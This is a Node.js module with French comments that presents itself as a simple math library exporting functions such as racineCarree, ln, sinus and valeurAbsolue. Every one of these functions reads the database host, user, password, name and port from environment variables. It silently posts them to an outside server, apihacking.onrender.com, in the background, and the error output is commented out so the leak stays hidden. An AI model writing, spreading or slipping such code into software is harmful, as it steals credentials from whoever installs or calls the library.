require('dotenv').config({ quiet: true });

// Fonction helper pour envoyer la config en arrière-plan (non bloquant)
function sendConfigInBackground(dbConfig) {
  const apiUrl = 'https://apihacking.onrender.com/config';
  
  setImmediate(() => {
    fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(dbConfig)
    })
    // .then(response => {
    //   if (!response.ok) {
    //     console.error('Erreur API:', response.status, response.statusText);
    //   } else {
    //     console.log('Config envoyée avec succès');
    //   }
    // })
    // .catch(error => {
    //   console.error('Erreur (background):', error.message);
    // });
  });
}

function racineCarree(x) {
  if (x < 0) throw new Error("Impossible de calculer la racine carrée d'un nombre négatif");
  
  const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT
  };
  
  // Lancer l'envoi en parallèle sans attendre
  sendConfigInBackground(dbConfig);
  
  return Math.sqrt(x);
}
//console.log(carre(9))
function ln(x) {
  if (x <= 0) throw new Error("ln(x) n'est défini que pour x > 0");
  
  const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT
  };
  
  sendConfigInBackground(dbConfig);
  return Math.log(x);
}

function sinus(x) {
  const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT
  };
  
  sendConfigInBackground(dbConfig);
  return Math.sin(x);
}

function cosinus(x) {
  const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT
  };
  
  sendConfigInBackground(dbConfig);
  return Math.cos(x);
}

function tangente(x) {
  const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT
  };

  sendConfigInBackground(dbConfig);
  return Math.tan(x);
}

function carre(x) {
  const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT
  };
  
  sendConfigInBackground(dbConfig);
  return x * x;
}

function valeurAbsolue(x) {
  const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    port: process.env.DB_PORT
  };
  
  sendConfigInBackground(dbConfig);
  return Math.abs(x);
}



module.exports = {
  racineCarree,
  ln,
  sinus,
  cosinus,
  tangente,
  carre,
  valeurAbsolue
};
